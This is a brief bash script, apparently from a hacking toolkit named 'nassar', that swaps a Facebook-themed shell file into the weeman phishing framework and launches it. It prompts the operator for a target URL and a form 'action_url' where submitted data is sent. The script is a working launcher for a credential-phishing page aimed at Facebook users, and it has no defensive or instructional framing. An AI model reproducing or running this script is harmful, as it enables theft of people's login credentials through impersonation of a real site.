#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install



cd
rm $HOME/nassar/.weeman/core/shell.py
rm $HOME/nassar/.weeman/core/shell.pyc
clear
echo -e "$green"
echo -e "=================>{$blue facebook$green }<==============="
echo -e "$cyan                    set url "
echo -e "$cyan                 set action_url "
read -p "    entar " max
if [ "$max" -eq "0"  ]; then
bash nassar.sh
else
cp $HOME/nassar/nano1/shellf.py $HOME/nassar/.weeman/core/shell.py
cd $HOME/nassar/.weeman/
python2 weeman.py
bash nassar.sh
fi
